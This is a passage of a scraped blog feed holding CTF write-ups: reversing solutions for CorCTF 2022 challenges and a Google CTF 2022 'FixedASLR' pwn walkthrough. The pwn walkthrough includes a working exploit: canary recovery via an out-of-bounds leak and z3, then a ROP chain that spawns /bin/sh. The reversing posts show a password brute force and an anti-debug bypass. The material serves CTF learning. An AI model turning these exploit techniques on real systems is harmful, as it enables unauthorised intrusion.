std::io::stdio::_print::hccc6c4adfff98fee(); core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$u8$GT$$GT$::h34608ea8b4b90afb(\u0026amp;self); } this look like an encrypted flag\nqmemcpy(v10, \u0026quot;R^CRIWJM\u0026lt;6.[5I.G`.C3G3CB5_V?P\u0026quot;, sizeof(v10));\nThen lots of shellcodes\nAlso variable v13 use for splitting Correct! and Incorrect!:\nreturn after \u0026ldquo;dst\u0026rdquo; call.\ndst might contain shellcode setup vm, breakpoint and debug to know what it doing\nNote: For begginer like me, we can use both wsl and a vm as long as we running the linux_server file which we can find in IDA folder in /dbgsrv . Set up the parameter for the debug options then we ready to go . also the binary file also need to we on the same location as the server file otherwise it can copy it which sometimes might be a problem there and i recommned using the vm instead of wsl, wsl may sometimes crash when i use it.\nHit the breakpoint, then f7 for step into\nlook for what inside \u0026ldquo;dst\u0026rdquo; :\nuntil call near ptr unk_7F8C04CC62B2, it required input, so i try \u0026ldquo;abcdefgh\u0026rdquo;\nby then encrypted flag and our input loaded in.\nContinue trace and debug, it take each byte of our input c, then:\nc^0x13 - 0x1e and compare with each char from flag encrypted.\nRev time!!\n1 2 3 4 5 6 fl = b\u0026#34;R^CRIWJM\u0026lt;6.[5I.G`.C3G3CB5_V?P\u0026#34; s = \u0026#34;\u0026#34; j = 0 for i in fl: s+=chr((i+0x1E)^0x13) print(s) #corctf{xIG_j@t_vm_rBvBrs@ngN} but wrong, might be missing something\nthe SHA256 key provide by the challenge\ncorctf{xIG_j@t_vm_rBvBrs@ngN}\nMy this i think of brute forceing but didn\u0026rsquo;t solve it, after the events end and viewing hint from other players and also asking the author here is what we do.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 from pwn import * fl = b\u0026#34;R^CRIWJM\u0026lt;6.[5I.G`.C3G3CB5_V?P\u0026#34; s = \u0026#34;\u0026#34; j = 0 for i in fl: s+=chr((i+0x1E)^0x13) print(s) hashflag = \u0026#34;dc136f8bf4ba6cc1b3d2f35708a0b2b55cb32c2deb03bdab1e45fcd1102ae00a\u0026#34; xflag = \u0026#34;corctf{xIG_j@t_vm_rBvBrs@ngN}\u0026#34; for I in range(0xf7): for G in range(0xf7): for a in [\u0026#39;1\u0026#39;,\u0026#39;i\u0026#39;,\u0026#39;I\u0026#39;]: for B in [\u0026#39;3\u0026#39;,\u0026#39;e\u0026#39;,\u0026#39;E\u0026#39;,]: for N in range(0xf7): temp = xflag.replace(\u0026#39;I\u0026#39;,chr(I)).replace(\u0026#39;G\u0026#39;,chr(G)).replace(\u0026#39;@\u0026#39;,a).replace(\u0026#39;B\u0026#39;,B).replace(\u0026#39;N\u0026#39;,chr(N)) hashed_string = hashlib.sha256(temp.encode(\u0026#39;utf-8\u0026#39;)).hexdigest() if hashed_string==hashflag: print(temp) exit(0) #corctf{x86_j1t_vm_r3v3rs1ng?} Flag: corctf{x86_j1t_vm_r3v3rs1ng?}\nmsfrob Description:\n6b0a444558474b460a5a58454d584b470a5f5943444d0a444558474b460a4d464348490a4c5f44495e4345445904\nAttachment file:\nmsfrob\nOpen with DiE\nIDA static analysis\nthe program take out input through agrv then loop 20, however IDA didn\u0026rsquo;t recogninese any of these. I have spent so much time looking for way to understand it. Then accidently on the internet i saw, people use tracing in IDA for detect functions that get imported from the libary so we have to setup a trace functions and call stack, modules to look for what functions being imported.\nThis challenge also took me most of the time, since also error when running\nI\u0026rsquo;ve to look up for the missing libs that the program required, and insall it, also my wsl dont really accept it might be beauce missing some required libs\nlibcrypto.so.1.1, isntall openssl as version 1.1 too.\nafter fixing\nbefore going the loop it go through 2 functions, which dont really important so we can pass on it without tracing\nbefore calling the first functioin in the loop.\nTrace each by set breakpoint after the function call, by then we have the complete source code here.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 __int64 __fastcall sub_55A613A3B4E1(__int64 input, __int64 a2) { __int64 aes; // rax __int64 result; // rax int len_out; // [rsp+1Ch] [rbp-894h] BYREF int blocksize; // [rsp+20h] [rbp-890h] BYREF int i; // [rsp+24h] [rbp-88Ch] __int64 CipherCTX; // [rsp+28h] [rbp-888h] __int64 *v8; // [rsp+30h] [rbp-880h] BYREF int v9; // [rsp+38h] [rbp-878h] __int64 *v10; // [rsp+48h] [rbp-868h] int v11; // [rsp+50h] [rbp-860h] __int64 len_in; // [rsp+58h] [rbp-858h] __int64 v13; // [rsp+70h] [rbp-840h] __int64 v14; // [rsp+78h] [rbp-838h] __int64 v15; // [rsp+80h] [rbp-830h] __int64 buf_out[128]; // [rsp+A0h] [rbp-810h] BYREF __int64 buf_in[2]; // [rsp+4A0h] [rbp-410h] BYREF char v18[1016]; // [rsp+4B0h] [rbp-400h] BYREF unsigned __int64 v19; // [rsp+8A8h] [rbp-8h] v19 = __readfsqword(0x28u); memset(buf_out, 0, sizeof(buf_out)); buf_in[0] = 0LL; buf_in[1] = 0LL; memset(v18, 0, 0x3F0uLL); len_out = sub_55A613A3B080(input, a2, v18); sub_55A613A3B120(); for ( i = 0; i \u0026lt;= 19; ++i ) { v13 = 0LL; v14 = 0LL; v15 = 0LL; v9 = len_out; v8 = buf_out; v11 = 1024; v10 = buf_in; Deflate_init((__int64)\u0026amp;v8, 0xFFFFFFFFLL, (__int64)\u0026#34;1.2.12\u0026#34;, 112LL); Deflate(\u0026amp;v8, 4LL); Deflate_end(\u0026amp;v8); CipherCTX = CIPHER_CTX_new(); aes = Aes_256_cbc(); Encrypt_init(CipherCTX, aes, 0LL, (__int64)\u0026amp;key, (__int64)\u0026amp;iv); EncryptUpdate(CipherCTX, buf_out, \u0026amp;len_out, buf_in, (unsigned int)len_in); EncryptFinal_ex(CipherCTX, (char *)buf_out + len_out, \u0026amp;blocksize); CIPHER_CTX_free(CipherCTX); len_out += blocksize; } if ( (unsigned int)sub_55A613A3B0F0(buf_out, \u0026amp;byte, 352LL) ) sub_55A613A3B040(\u0026#34;Incorrect :msfrog:\u0026#34;); else sub_55A613A3B040(\u0026#34;Correct :msfrogcircle:\u0026#34;); result = v19 - __readfsqword(0x28u); if ( result ) return sub_55A613A3B0E0(); return result; } Our input got deflate (compress) and 16 bytes of compressed_data got encrypt with AES_CBC (with key, iv known, EncryptUpdate()) and function Encrypt_final_ex() encrypted the other compressed_data then store in the beginning\ncompressed_data have 16 \u0026lt; lenght \u0026lt; 32 with output store on buf_out with length 32. In the next loop, it take 32 bytes then compress and repeat like the previous, buf_out now has length 48 until length = 352 (repeat until 20) then exit, Here is what is look like when transfer to code in python\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad import zlib byte = b\u0026#39;L\\xef4\\xfa\\xd1%EK\\xe7\\xad\\x99\\xc4\\xb1\\xd7\\xf6,[\\xf3\\x13\\xbf\\xcc\\x03\\x1d\\x16\\x81\\xdbP8\\xa8\\xb6\\xdd \\x90*n\\xa2\\xef\\xfek\\x8f\\xdb\\x80opt\\xeb}6\\xe4\\xdc\\x87\\xf3 \\xeb\\xe5\\x0f\u0026gt;(5X\\xad\\x07\\xd2=\\xd8]A5^OA\\x9b\\x91\\x85\\xe1\\\\\\x18\\xb8\\xf6Z\\xdf\\x0851\\x04\\xd2\\xe0Dd\\xfc\\x06\\xc6\\xd6[\\x98 O\\x1c\\x1e\\xb8 \\xd5\\x9e\\xda\\x81\\xd66[U`\\xa8,\\xf2\\xdaW\\x92\\xc9\\xe0\\x14\\xf0CK.\\x11\\xd3pg\\xa8U\\x08}\\xc7vOw\\xe8\\xbe\\xf3\\x19\\x04\\x84\\xb2\\xa0 \\xdcL\\xd2\\xc8\\x94\\x17\\x9buOx55\\xe6bt-\\x0c\\xa84\\xf1\\x90\\xa9\\xfdY\\xd4\\xf8$\\xb9;\\x94\\xbdy\\xc7x\\xb9V\\xc1\\xe3\\xb6.\\x17:2\\xf9NG\\xf9\\t\\xc4\\xe8\\xfaISj\\x0b\\xb96\\x0b+\\\\\\xc9\\xf39c\\xb3\\xd1\\xacpl\\xf1FB\\xbc\\x0b\\x91:d\\x95w\\xec$\\x01d\\xd2\\x98\\xe1\\xbf8\\x17\\xd4\\xd09\\x16\\x13\\x1d4\\xa4\\x1a\\xfa3_\\x88!\\xd5\\\\N\\xbf3\\x9d\\xe1*\\xccG\\x15\\x03\\x9d\\xa6\\x856-m1\\x01=\\x95\\x08\\xdcr\\xd3\\xf6\\xf7e\\xb7\\xc0\\x95]\\xf4\\xc9\\xa7\\xfa\\xdc\\xefQ6\\xc1\\x1d\\xe6\\x08\\xeb\\x8a\\xec]\\xc9Z=\\xd3\\x9a\\xa6\\xad(\\x99$\\x88\\x92@-\\xab\\x12Y\\xf8\\x84G\\xb2\\xb9H\\xf7\\x8f\\x1e2d\\xba$\\xd2=\\xf3\\xc4\\x84\\xbd\\xd2\\xe1\\x01\\x07\\xa1v\\x18E\\x1eT\\x91\\x93\\x11nAT~@\\xe7\\x02\u0026#39; key = b\u0026#39;\\xd4\\xf5\\xd9g\\x15/w\\x7fl|Fs\\xf6\\xf0\\x92\\xf0wP;0\\x0c\\x87\\x8a\\r\\x9c\\x1dr\\xa2eF\\xc8\\xdc\u0026#39; # cipher explain inp = b\u0026#39;corctf{abcdefgh}\u0026#39; buf_out = inp for i in range(20): text = zlib.compress(buf_out) cipher = AES.new(key, AES.MODE_CBC,iv= (b\u0026#39;\\x00\u0026#39;*16)) first = cipher.encrypt(text[:16]) final = cipher.encrypt(pad(text[16:],16)) buf_out = first + final print(buf_out) Reverse the logic here.\nFinal script:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 from Crypto.Cipher import AES from Crypto.Util.Padding import pad, unpad import zlib byte = b\u0026#39;L\\xef4\\xfa\\xd1%EK\\xe7\\xad\\x99\\xc4\\xb1\\xd7\\xf6,[\\xf3\\x13\\xbf\\xcc\\x03\\x1d\\x16\\x81\\xdbP8\\xa8\\xb6\\xdd \\x90*n\\xa2\\xef\\xfek\\x8f\\xdb\\x80opt\\xeb}6\\xe4\\xdc\\x87\\xf3 \\xeb\\xe5\\x0f\u0026gt;(5X\\xad\\x07\\xd2=\\xd8]A5^OA\\x9b\\x91\\x85\\xe1\\\\\\x18\\xb8\\xf6Z\\xdf\\x0851\\x04\\xd2\\xe0Dd\\xfc\\x06\\xc6\\xd6[\\x98 O\\x1c\\x1e\\xb8 \\xd5\\x9e\\xda\\x81\\xd66[U`\\xa8,\\xf2\\xdaW\\x92\\xc9\\xe0\\x14\\xf0CK.\\x11\\xd3pg\\xa8U\\x08}\\xc7vOw\\xe8\\xbe\\xf3\\x19\\x04\\x84\\xb2\\xa0 \\xdcL\\xd2\\xc8\\x94\\x17\\x9buOx55\\xe6bt-\\x0c\\xa84\\xf1\\x90\\xa9\\xfdY\\xd4\\xf8$\\xb9;\\x94\\xbdy\\xc7x\\xb9V\\xc1\\xe3\\xb6.\\x17:2\\xf9NG\\xf9\\t\\xc4\\xe8\\xfaISj\\x0b\\xb96\\x0b+\\\\\\xc9\\xf39c\\xb3\\xd1\\xacpl\\xf1FB\\xbc\\x0b\\x91:d\\x95w\\xec$\\x01d\\xd2\\x98\\xe1\\xbf8\\x17\\xd4\\xd09\\x16\\x13\\x1d4\\xa4\\x1a\\xfa3_\\x88!\\xd5\\\\N\\xbf3\\x9d\\xe1*\\xccG\\x15\\x03\\x9d\\xa6\\x856-m1\\x01=\\x95\\x08\\xdcr\\xd3\\xf6\\xf7e\\xb7\\xc0\\x95]\\xf4\\xc9\\xa7\\xfa\\xdc\\xefQ6\\xc1\\x1d\\xe6\\x08\\xeb\\x8a\\xec]\\xc9Z=\\xd3\\x9a\\xa6\\xad(\\x99$\\x88\\x92@-\\xab\\x12Y\\xf8\\x84G\\xb2\\xb9H\\xf7\\x8f\\x1e2d\\xba$\\xd2=\\xf3\\xc4\\x84\\xbd\\xd2\\xe1\\x01\\x07\\xa1v\\x18E\\x1eT\\x91\\x93\\x11nAT~@\\xe7\\x02\u0026#39; key = b\u0026#39;\\xd4\\xf5\\xd9g\\x15/w\\x7fl|Fs\\xf6\\xf0\\x92\\xf0wP;0\\x0c\\x87\\x8a\\r\\x9c\\x1dr\\xa2eF\\xc8\\xdc\u0026#39; # cipher explain inp = b\u0026#39;corctf{abcdefgh}\u0026#39; buf_out = inp for i in range(20): text = zlib.compress(buf_out) cipher = AES.new(key, AES.MODE_CBC,iv= (b\u0026#39;\\x00\u0026#39;*16)) first = cipher.encrypt(text[:16]) final = cipher.encrypt(pad(text[16:],16)) buf_out = first + final print(buf_out) #rev p1 = byte[:16] p2 = byte[16:] # first = p1 # final = p2 for i in range(20): cipher = AES.new(key, AES.MODE_CBC,iv= (b\u0026#39;\\x00\u0026#39;*16)) first = cipher.decrypt(p1) final = cipher.decrypt(p2) comp_text = first+final decomp_text = zlib.decompress(comp_text) p1 = decomp_text[:16] p2 = decomp_text[16:] print(decomp_text) Flag: corctf{why_w0u1d_4ny0n3_us3_m3mfr0b??}\nhackermans dungeon Description:\nHackerman told us he cannot be hacked. Can you hack hackerman?\nAttachment file:\nhackermans_dungeon.exe\nThis challenge i also not finished during the game time, so now we redo it here\nOpen with IDA, i also thought we should tracing too, however the other solver use ida plugin which is new to mefindcrypt.\nFrom the hint, I find it similar to some pieces of code that comes from a well known encryption algorithm. To test my theory, I used findcrypt-yara plugin from IDA to find if there’s any well known constant in an algorithm. And it ended up showing 3 popular ones: CRC32, SHA256 and MD5.\nHaving those hints, I can easily spot functions that are related to those 3 algorithms:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 v29 = 0i64; v30 = 1732584193; v20 = -1i64; v31 = -271733879; v32 = -1732584194; v33 = 271733878; do ++v20; while ( Src[v20] ); MD5_Init(\u0026amp;v29, Src); MD5_Final(\u0026amp;v29); *(_OWORD *)\u0026amp;v28[1] = v34; do ++v9; while ( Src[v9] ); SHA256(Src, v9); if ( !strcmp(Buffer, \u0026#34;CORnwallis\u0026#34;) \u0026amp;\u0026amp; !memcmp(\u0026amp;unk_7FF7EEF27068, Buf2, 0x20ui64) ) { memset(v35, 0, sizeof(v35)); CHACHA_Init(v35, Buf2, \u0026amp;v28[1]); LODWORD(v35[22]) = 42; v35[15] = 42i64; v22 = LOBYTE(v35[13]) | ((BYTE1(v35[13]) | (WORD1(v35[13]) \u0026lt;\u0026lt; 8)) \u0026lt;\u0026lt; 8); v35[8] = 64i64; HIDWORD(v35[22]) = LOBYTE(v35[13]) | ((BYTE1(v35[13]) | (WORD1(v35[13]) \u0026lt;\u0026lt; 8)) \u0026lt;\u0026lt; 8); v23 = 0i64; v24 = 64i64; do { if ( v24 \u0026gt;= 0x40 ) { CHACHA_key_generate(v35); v8 = 0i64; v35[8] = 0i64; } v25 = *((_BYTE *)v35 + v8++); byte_7FF7EEF27040[v23] ^= v25; v24 = v8; ++v23; v35[8] = v8; } while ( v23 \u0026lt; 0x23 ); LODWORD(v28[0]) = 0; CRC32(v22, v21, v28); These Crypto make head crackkk !!!!! :(((\nThere is actually one exception that findcrypt-yara can’t figure out, which is CHACHA. But we can easily identify that by finding the string expand 32-byte k in a function and google it, which results in many aritcles about CHACHA.\nrockyou.txt\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 from hashlib import sha256 from itertools import count from pwn import * from Crypto.Cipher import Salsa20,ChaCha20 from pwn import * pwhash = b\u0026#34;\\x9c\\x00\\xf1\\xaccb\\x16\\xe24/d\\xae;\\x82\\xe3\\xc0\u0026#39;I\\xa6\\x9c5\\xdf\\x8c\\x03UMU\\xc1\\x01\\x86\\x9dG\u0026#34; # username = b\u0026#39;CORnwallis\u0026#39; #[patch_byte(0x0B010D3F7F0+i,d) for i,d in zip(range(35),b\u0026#34;\\x9c\\x00\\xf1\\xaccb\\x16\\xe24/d\\xae;\\x82\\xe3\\xc0\u0026#39;I\\xa6\\x9c5\\xdf\\x8c\\x03UMU\\xc1\\x01\\x86\\x9dG\u0026#34;)] # byte = b\u0026#39;:\\xab5\\x81\\xd5_V\\xb0\\xce\\xe5\\xf5\\x16M\\xb3\\x8d-x#\\xd0\\x1c\\x00\\xc1\\xec\\x07\\x19\\x022\\x91J\\xb4c\\xcc\\xed\\xd9\\x08\u0026#39; def SUScrypt(password): password = [i for i in password] lenpw = len(password) j = 0 k = 1 while j\u0026lt;lenpw: password[j]+=1 password[j] = (~((password[k % lenpw] ^ password[j]) + 98))\u0026amp;0xff; k+=1 j+=1 return b\u0026#34;\u0026#34;.join([i.to_bytes(1,\u0026#39;big\u0026#39;) for i in password]) f = open(\u0026#39;rockyou.txt\u0026#39;,\u0026#39;rb\u0026#39;).readlines() for pw in f: # print(sha256(SUScrypt(pw[:-1])).digest()) if sha256(SUScrypt(pw[:-1])).digest()==pwhash: print(pw) break while checking whether the SUScrypt function works properly, I tried debugging many times, and I found that although there is a md5 section, it does not affect the Buf2 section =)), so it affects another variable, and when I patch buf2, it still does not produce a flag. So while writing the script, I did not use md5\nRun a bit and get the password: canthackmehackers\nEnter the password, set a breakpoint, bypass anti-debug and check byte_1400740:\nIn order to bypass at jnz edit ZeroFlag = 1, and at jnb edit CarryFlag = 1\nFlag: corctf{d1d_y0u_h4ck_m3_h4ck3rm4n?}\nDone!\n","description":"CorCTF2022 Writeups","id":15,"section":"posts","tags":["ctf","reverseing","writeups"],"title":"CORCTF2022","uri":"https://duythucne22.github.io/posts/2022/corctf2022/"},{"content":"Google CTF 2022 - FixedASLR Reference source https://chovid99.github.io/posts/google-ctf-2022/\nhttps://github.com/nobodyisnobody/write-ups/tree/main/Google.CTF.2022/pwn/FixedASLR\nOriginal challenge link: https://capturetheflag.withgoogle.com/challenges/pwn-fixedaslr\nYou can also download challenge files in my repo: fixedaslr.zip\nDownload and extract the zip, then we can get started!\n1. Find bug First, let\u0026rsquo;s check the basic information of all files:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ file * loader: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=71086f1a8e8132c20313b70de229555e4f551144, not stripped basic.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped debug.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped game.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped guard.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped main.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped res.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped syscalls.o: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), not stripped $ checksec loader [*] \u0026#39;/home/nguyenhuutri/CTF/GoogleCTF2022/FixedASLR/loader\u0026#39; Arch: amd64-64-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) So this is a 64-bit file called loader and 7 object files basic.o, debug.o, game.o, guard.o, main.o, res.o and syscalls.o. The file loader just have NX enabled and others are off.\nFirst, let\u0026rsquo;s decompile the loader.\nIt first read 8 random bytes from /dev/urandom to rand_state so we cannot imitate this value. It then init stack guard (canary) with the seed above by calling rand(64):\nIn rand(), it get per bit to compute a 64-bit data. Jump into function rand_get_bit() and we can see:\nThis is a 64-bit Linear-feedback shift register (LFSR). With the first seed it got from /dev/urandom, it procedures the canary which is equal to rand_state now. It then takes that canary and procedures address for object files in load_o_phase_1.\nIn function load_o_phase_1, there is a function called aslr_get_addr which will execute rand(12) to get 12-bit data and create a mapped address with that value:\nThat\u0026rsquo;s all important things for the file loader. Let\u0026rsquo;s analyze all object files.\nFor an easy reversing, we can link all object files into 1 file with command gcc *.o -o chall and open it with ida64. In main(), nothing intersting. Let\u0026rsquo;s jump into menu()\nIn menu(), we can choose 4 option. The first one is to play game. It just a simple sum of 2 number without any bug here. After we failed the game, it will jump into function check_scoreboard() with argument is score:\nIt then will execute shift_scoreboard(), which is not interesting because we cannot input anything here. Let\u0026rsquo;s check the other one get_player_name().\nIn this function, it will ask for length of name but doesn\u0026rsquo;t check that length:\nHence, we have a Buffer Overflow here. But due to custom canary, we cannot do anything with this bug unless we can leak the canary.\nWith the second option, see_full_scoreboard(), it just simply takes datas from the global variable and print it out and we cannot change that too.\nWith the third option, we can see the score of players with our chosen index:\nLook more carefully, we can see that the program doesn\u0026rsquo;t check if index is valid \u0026ndash;\u0026gt; Out Of Bound. Hence, we can leak data which might be helpful for us.\n2. Idea Look at those 2 bug, we\u0026rsquo;re sure that we will take advantage of bug Buffer Overflow to control the rip. But there is canary, how can we do that?\nAfter trying to leak canary with the bug Out Of Bound but not successfull, I then read writeup and know that I should leak address of each object because those addresses are the result of rand(12). And if we can get all the result from rand(12), we might recover the seed, which is the canary value.\nAnd if we can leak the canary successfully, we will need the address of debug.o because that file contains lots of useful gadget.\nSummary:\nStage 1: Leak ASLR \u0026ndash;\u0026gt; Canary Stage 2: Get address of debug.o Stage 3: ROPchain 3. Exploit Before we go to the exploitation, I wrote these functions to provided a handy way to exploit:\nCode snipet\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 def rand_extract_bit(bit): global rand_state return (rand_state \u0026gt;\u0026gt; bit) \u0026amp; 1 def rand_get_bit(): global rand_state bit0 = rand_extract_bit(63) bit1 = rand_extract_bit(61) ^ bit0 bit2 = rand_extract_bit(60) ^ bit1 bit4 = rand_extract_bit(58) ^ bit2 ^ 1 rand_state = ((2 * rand_state) | bit4) \u0026amp; 0xffffffffffffffff return bit4 def rand(bit): num = 0 for i in range(bit): b = rand_get_bit() num = (2 * num) | b return num def playgame(roundnum): p.sendlineafter(b\u0026#39;choice?\\n\u0026#39;, b\u0026#39;1\u0026#39;) for i in range(roundnum): datas = p.recvuntil(b\u0026#39; ?\\n\u0026#39;, drop=True).split(b\u0026#39; \u0026#39;) p.sendline(str(int(datas[-1]) + int(datas[-3])).encode()) datas = p.recvuntil(b\u0026#39; ?\\n\u0026#39;, drop=True).split(b\u0026#39; \u0026#39;) p.sendline(str(int(datas[-1]) + int(datas[-3]) + 1).encode()) def seescore(idx): p.sendlineafter(b\u0026#39;choice?\\n\u0026#39;, b\u0026#39;3\u0026#39;) p.sendlineafter(b\u0026#39;(0-9)?\\n\u0026#39;, str(u64(struct.pack(\u0026#34;\u0026lt;q\u0026#34;, idx))).encode()) p.recvuntil(b\u0026#39;score: \u0026#39;) return int(p.recvline()[:-1]) Because we will need to recover the seed (canary), function rand() will be needed.\nStage 1: Leak ASLR \u0026ndash;\u0026gt; Canary First, we want to leak all the aslr so let\u0026rsquo;s debug with gdb first to get the correspond address and the order of each address. Debug file loader with gdb-gef and we can get the data from /dev/urandom:\nAnd with python function rand() above, we can calculate 7 values from rand(12):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 \u0026gt;\u0026gt;\u0026gt; def rand_extract_bit(bit): ... global rand_state ... return (rand_state \u0026gt;\u0026gt; bit) \u0026amp; 1 ... \u0026gt;\u0026gt;\u0026gt; def rand_get_bit(): ... global rand_state ... bit0 = rand_extract_bit(63) ... bit1 = rand_extract_bit(61) ^ bit0 ... bit2 = rand_extract_bit(60) ^ bit1 ... bit4 = rand_extract_bit(58) ^ bit2 ^ 1 ... rand_state = ((2 * rand_state) | bit4) \u0026amp; 0xffffffffffffffff ... return bit4 ... \u0026gt;\u0026gt;\u0026gt; def rand(bit): ... num = 0 ... for i in range(bit): ... b = rand_get_bit() ... num = (2 * num) | b ... return num ... \u0026gt;\u0026gt;\u0026gt; rand_state = 0x376f5a42c42dc2c3 \u0026gt;\u0026gt;\u0026gt; hex(rand(64)) \u0026#39;0x43bc56f88fb37843\u0026#39; # This will be canary and seed for rand(12) \u0026gt;\u0026gt;\u0026gt; hex(rand(12)) \u0026#39;0xd8d\u0026#39; # main.o \u0026gt;\u0026gt;\u0026gt; hex(rand(12)) \u0026#39;0xa9a\u0026#39; # syscalls.o \u0026gt;\u0026gt;\u0026gt; hex(rand(12)) \u0026#39;0x30c\u0026#39; # guard.o \u0026gt;\u0026gt;\u0026gt; hex(rand(12)) \u0026#39;0x575\u0026#39; # basic.o \u0026gt;\u0026gt;\u0026gt; hex(rand(12)) \u0026#39;0xacd\u0026#39; # game.o \u0026gt;\u0026gt;\u0026gt; hex(rand(12)) \u0026#39;0x699\u0026#39; # res.o \u0026gt;\u0026gt;\u0026gt; hex(rand(12)) \u0026#39;0xc89\u0026#39; # debug.o Type c and Ctrl + C to pause gdb, then type vmmap to get all the address we have:\nWe can see that all the address are based on the result of rand(12) above. The global variable game_scoreboard is located at 0x0000d8d0002000 but in reality, we don\u0026rsquo;t know this address.\nLooking all data in this address range, we can see at 0x0000d8d0003000 has something useful:\nAnd the address 0xd8d is address of main.o so the python script to get that address will be as following:\n1 main_o = seescore(512) \u0026amp; 0xfffffffffffff000 Continue looking around address of main and we can see at address 0x0000d8d0000000 contains another address:\nAnd the script for leaking those address can be:\n1 2 guard_o = seescore(-1017) \u0026amp; 0xfffffffffffff000 game_o = seescore(-1019) \u0026amp; 0xfffffffffffff000 And no more address can be get from within main.o address. Now, we will use command search-pattern to search for the other address to see if there are some address containing the address we are looking for:\nAnd we can see the address 0xacd000000b may contain the address begining with 0x5750:\nThe address begining with 0x5750 is address of basic.o so we have the following script:\n1 basic_o = seescore( int(((game_o - 0x1000) - main_o)/8) + 1 ) \u0026amp; 0xfffffffffffff000 Let\u0026rsquo;s search for the next address begining with 0x6990:\nThe address 0xacd0002000 might contain address begining with 0x6990:\nSo the script for this is:\n1 res_o = seescore( int(((game_o + 0x1000) - main_o)/8) ) \u0026amp; 0xfffffffffffff000 Next, we will find the address begining with 0xa9a0:\nAnd that address is the address of guard.o which containing address of syscalls.o:\nAnd the script is:\n1 syscalls_o = seescore( int(((guard_o - 0x1000) - main_o)/8) + 1 ) \u0026amp; 0xfffffffffffff000 With the seventh address, we cannot find any place containing that so maybe just 6 is enough.\nNow with the known result, just put it into and array first with order:\n1 2 3 4 5 6 7 known_states = [0]*6 known_states[0] = main_o \u0026gt;\u0026gt; 28 known_states[1] = syscalls_o \u0026gt;\u0026gt; 28 known_states[2] = guard_o \u0026gt;\u0026gt; 28 known_states[3] = basic_o \u0026gt;\u0026gt; 28 known_states[4] = game_o \u0026gt;\u0026gt; 28 known_states[5] = res_o \u0026gt;\u0026gt; 28 And we will use z3 as the reference source above does to recover the canary for us:\n1 2 3 4 5 6 7 8 9 s = Solver() rand_state = BitVec(\u0026#39;x\u0026#39;, 64) for known_state in known_states: s.add(rand(0xc) == known_state) if s.check() == sat: model = s.model() canary = model[BitVec(\u0026#39;x\u0026#39;, 64)].as_long() log.info(\u0026#34;Canary: \u0026#34; + hex(canary)) After that, let\u0026rsquo;s try to run the script and attach with gdb to check if our canary is correct or not. This is the canary from gdb:\nAnd this is the recovered canary:\nThose canary are equal! Let\u0026rsquo;s move on!\nStage 2: Get address of debug.o To get the address of debug.o, we just simply set the rand_state to the value of canary and then rand(12) to get the base address of debug.o\n1 2 3 4 5 rand_state = canary for i in range(6): rand(0xc) debug_o = rand(0xc) \u0026lt;\u0026lt; 28 log.info(\u0026#34;debug_o: \u0026#34; + hex(debug_o)) Stage 3: ROPchain Now, with the canary recovered, we can craft our ROPchain to create the shell for us. So let\u0026rsquo;s get all the gadget we can use with tools objdump:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $ objdump -d debug.o 0000000000000000 \u0026lt;_debug_set_reg_rdi\u0026gt;: 0:\t57 push %rdi 1:\t5f pop %rdi 2:\tc3 ret 0000000000000003 \u0026lt;_debug_set_reg_rsi\u0026gt;: 3:\t57 push %rdi 4:\t5e pop %rsi 5:\tc3 ret 0000000000000006 \u0026lt;_debug_set_reg_rax\u0026gt;: 6:\t57 push %rdi 7:\t58 pop %rax 8:\tc3 ret ... 000000000000000f \u0026lt;_debug_set_reg_rdx\u0026gt;: f:\t57 push %rdi 10:\t5a pop %rdx 11:\tc3 ret ... And those gadget will be available at base address add 0x1000. Also we can see that after the program get player name, stop at ret of get_player_name(), we can see rdi is pointing to the begining of our input. The script to check this will be:\n1 2 playgame(20) p.sendafter(b\u0026#39;name:\\n\u0026#39;, cyclic(0x100)) And attach with gdb to get that:\nSo we just simply put the string /bin/sh at the begining of our payload and pad to the canary, then input shellcode and we can get the shell:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 pop_rsi = debug_o + 0x1000 + 0x4 pop_rax = debug_o + 0x1000 + 0x7 pop_rdx = debug_o + 0x1000 + 0x10 syscall = syscalls_o + 2 p.sendlineafter(b\u0026#39;(0-31)?\\n\u0026#39;, str(0x1000).encode()) payload = flat( b\u0026#39;/bin/sh\\x00\u0026#39;, b\u0026#39;A\u0026#39;*0x20, canary, b\u0026#39;B\u0026#39;*8, # Fake rbp pop_rax, 0x3b, pop_rsi, 0, pop_rdx, 0, syscall, ) p.sendafter(b\u0026#39;name:\\n\u0026#39;, payload) Full script: solve.py\n4. Get flag Flag is CTF{GuessYouCanSayTheCookieGotRandomlyBroken}\n","description":"Write up for Google CTF 2022","id":16,"section":"posts","tags":["ctf","reverseing","writeups"],"title":"Google CTF 